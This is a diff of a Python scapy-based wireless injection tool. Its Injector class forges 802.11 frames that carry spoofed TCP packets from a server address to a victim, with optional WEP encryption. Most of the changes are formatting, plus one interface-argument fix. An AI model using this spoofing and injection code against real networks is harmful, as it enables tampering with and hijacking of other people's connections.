@@ -14,7 +14,7 @@ npackets = 0
 
 class Injector(object):
     """Uses scapy to inject packets on the networks"""
-
+    
     def __init__(self, interface):
         self.interface = interface
 
@@ -31,9 +31,7 @@ class Injector(object):
 
 
     def inject(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, args, procTimerStart, procTimerEnd):
-        """Inject function
-        Sends the injection using Scapy
-        """
+        """Send the injection using Scapy"""
         injectTimerStart = time.time()
         global npackets
         npackets += 1
@@ -84,8 +82,8 @@ class Injector(object):
                         /LLC()\
                         /SNAP()\
                         /IP(
-                            dst = vicip,
-                            src = svrip
+                           dst = vicip,
+                           src = svrip
                            )\
                         /TCP(
                             flags = 'FA',
@@ -100,18 +98,18 @@ class Injector(object):
                     
             if TSVal is not None and TSecr is not None:
                 packet[TCP].options = [
-                                        ('NOP', None),
-                                        ('NOP', None),
-                                        ('Timestamp',
-                                        ((round(time.time()), TSVal)))
-                                        ]
+                                      ('NOP', None),
+                                      ('NOP', None),
+                                      ('Timestamp',
+                                      ((round(time.time()), TSVal)))
+                                      ]
             else:
                 packet[TCP].options = [
-                                        ('NOP', None),
-                                        ('NOP', None),
-                                        ('Timestamp',
-                                        ((round(time.time()), 0)))
-                                        ]
+                                      ('NOP', None),
+                                      ('NOP', None),
+                                      ('Timestamp',
+                                      ((round(time.time()), 0)))
+                                      ]
 
             if args.p:
                 packet = wepEncrypt(packet, args.w)
@@ -142,17 +140,17 @@ class Injector(object):
             if args.p:
                 packet = RadioTap()\
                         /Dot11(
-                                FCfield = 'from-DS',
-                                addr1 = vicmac,
-                                addr2 = rtrmac,
-                                addr3 = rtrmac
-                                )\
+                              FCfield = 'from-DS',
+                              addr1 = vicmac,
+                              addr2 = rtrmac,
+                              addr3 = rtrmac
+                              )\
                         /LLC()\
                         /SNAP()\
                         /IP(
-                            dst = vicip,
-                            src = svrip
-                            )\
+                           dst = vicip,
+                           src = svrip
+                           )\
                         /TCP(
                             flags = "FA",
                             sport = int(svrport),
@@ -166,18 +164,18 @@ class Injector(object):
                         
                 if TSVal is not None:
                     packet[TCP].options = [
-                                            ('NOP', None),
-                                            ('NOP', None),
-                                            ('Timestamp',
-                                            ((round(time.time()), TSVal)))
-                                            ]
+                                          ('NOP', None),
+                                          ('NOP', None),
+                                          ('Timestamp',
+                                          ((round(time.time()), TSVal)))
+                                          ]
                 else:
                     packet[TCP].options = [
-                                            ('NOP', None),
-                                            ('NOP', None),
-                                            ('Timestamp',
-                                            ((round(time.time()), 0)))
-                                            ]
+                                          ('NOP', None),
+                                          ('NOP', None),
+                                          ('Timestamp',
+                                          ((round(time.time()), 0)))
+                                          ]
 
                 packet = wepEncrypt(packet, args.w)
                         
@@ -220,9 +218,10 @@ class Injector(object):
             try:
                 ### pyDot11 hack
                 if args.p:
-                    sendp(packet, iface = 'wlan0mon', verbose = 0)
+                    sendp(packet, iface = args.i, verbose = 0)
                 else:
                     sendp(packet, iface = self.interface, verbose = 0)
+
                 injectTimerEnd = time.time()
                 if args.d:
                     print '\nProcess Began: %f' % procTimerStart
